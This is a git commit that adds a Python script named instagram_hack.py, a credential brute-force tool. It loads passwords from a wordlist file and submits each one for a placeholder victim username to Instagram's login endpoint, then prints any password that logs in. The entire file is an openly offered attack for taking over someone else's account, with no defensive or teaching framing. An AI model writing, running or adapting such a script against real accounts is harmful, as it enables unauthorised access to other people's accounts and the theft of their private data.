252add1457f31684a7de002dd14e5711c17da5a6
Hobbel <165572731+Hobbel@users.noreply.github.com>
2025-02-27 14:29:29 +0000

    Create instagram_hack.py

---
+++ instagram_hack.py
@@ -0,0 +1,35 @@
+import requests
+
+# Instagram login URL
+login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+# Target username
+target_username = 'victim_username'
+
+# Load passwords from a file
+with open('passwords.txt', 'r') as file:
+    passwords = file.readlines()
+
+# Session to maintain cookies
+session = requests.Session()
+
+# Brute-force loop
+for password in passwords:
+    password = password.strip()
+    print(f'Trying password: {password}')
+    
+    # Login request
+    response = session.post(login_url, data={
+        'username': target_username,
+        'password': password,
+    }, headers={
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.instagram.com/accounts/login/',
+    })
+    
+    # Check if login was successful
+    if 'authenticated": true' in response.text:
+        print(f'[*] Success! Password: {password}')
+        break
+    else:
+        print('[-] Failed.')
